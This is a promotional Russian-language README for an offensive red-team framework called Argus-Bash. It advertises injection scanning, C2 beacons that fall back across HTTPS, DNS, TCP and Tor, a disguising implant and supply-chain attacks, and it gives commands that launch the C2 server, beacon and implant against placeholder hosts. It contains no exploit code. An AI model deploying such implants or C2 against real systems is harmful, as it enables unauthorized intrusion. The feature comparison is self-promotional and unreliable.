# Argus-Bash v56.0 — Red Team Framework

**77 сигнатур | 229 шаблонов Nuclei | 6 режимов работы | WebSocket C2 | Mimic Implant v2 | Hydra Beacon | Hunter Mode | After-Action Report**

Argus — автономный Red Team фреймворк, прошедший путь от bash-скрипта до профессионального инструмента за 56 версий.

## Возможности
- Пассивный сканер — 77 сигнатур + история запросов + авто-детект IDOR
- 12 типов инъекций — SQL, NoSQL, LDAP, XXE, SSTI, CMDi, LFI, SSRF, GraphQL, WebSocket
- Agentic Scanner — 6 режимов: smart, speed, deep, advisor, executor, favorites
- Sentinel AI — понимает ответы сервера и адаптирует атаку
- Malleable C2 — HTTPS Beacon (O365/Teams), DNS Beacon, WebSocket Beacon v2, Mimic Implant v2
- Hydra Beacon — самоисцеляющийся C2: перебирает HTTPS → DNS → TCP → Tor пока не соединится
- Hunter Mode — точечная охота на технологии (Grafana, WordPress, Log4j, Jenkins, K8s)
- Supply Chain Hunter — атака через разработчиков, хостинг, CDN
- Vault — AES-256 шифрование конфигов + авто-Vault
- After-Action Report — боевой журнал: векторы, хеши, pivot, Metasploit
- Echo — слепой детект WAF через timing (уникальная фича)
- Whisper — 100% пассивная разведка без единого запроса к цели (уникальная фича)
- Предполётная проверка + Оффлайн-режим + Авто-очистка

## Эксклюзивные возможности (не включены в публичный репозиторий)

Данный репозиторий содержит **базовую версию** Argus с полным функционалом сканирования и эксплуатации. 

**Продвинутые хакерские модули**, включая автономного диспетчера атак, систему доставки приманок, теневой C2 и другие уникальные фичи, **доступны только в закрытой версии**.

Для получения доступа к полной версии свяжитесь с разработчиком.

## Новое в v56.0
- 🦎 Mimic Implant v2 — проактивная маскировка под окружение
- 🐉 Hydra Beacon — 4 канала связи с авто-переключением
- 🎯 Hunter Mode — точечная охота на технологии
- 👂 Echo — слепой детект WAF через timing
- 🤫 Whisper — пассивная разведка без касания цели
- 📡 WebSocket C2 Server — управление агентами в реальном времени
- 📊 After-Action Report — боевой журнал
- 🛡️ 77 сигнатур (+10 CVE 2026)

## Быстрый старт
git clone https://github.com/manser-kay/argus-bash
cd argus-bash && chmod +x argus.sh argus
./argus check && ./argus help

## Использование
./argus scan http://target.com
./argus agentic http://target.com --mode speed
./argus passive
./argus c2 8443
./argus_hacker_report.sh ~/argus_scan_*/
./argus_hunt.sh grafana http://target.com:3000
./argus_echo.sh http://target.com
./argus_whisper.sh target.com

## Hydra Beacon
./argus_hydra_beacon.sh your-server.com

## Mimic Implant v2
python3 argus_implant_v2.py https://your-c2-server.com

## Уникальные фичи (нет ни у кого)
Self-learning payloads | Dead Man Switch | Стеганография | Honeypot Detector | P2P CVE Sync | Decoy Generator | Supply Chain Hunter | Mimic Implant | Hydra Beacon | Echo | Whisper

## Сравнение
| | Argus | Burp Pro | Metasploit | Nessus | CobaltStrike | Sliver | ZAP |
|---|---|---|---|---|---|---|---|
| Пассивный сканер | ✅ 77 | ✅ 100+ | ❌ | ❌ | ❌ | ❌ | ✅ 40+ |
| Repeater/Intruder | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ | ✅ |
| Инъекции | ✅ 12 | 2-3 | 5+ | ❌ | ❌ | ❌ | 3-4 |
| C2 Beacon | ✅ W+D+H+S+To | ❌ | ✅ | ❌ | ✅ | ✅ | ❌ |
| Agentic AI | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Supply Chain | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Echo (WAF timing) | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Whisper (passive) | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Hacker Report | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Цена | **$0** | $449/год | $15K | $3K | $3.5K | $0 | $0 |

## Ответственность
Инструмент создан для образовательных целей и легального тестирования безопасности.

## Лицензия
MIT
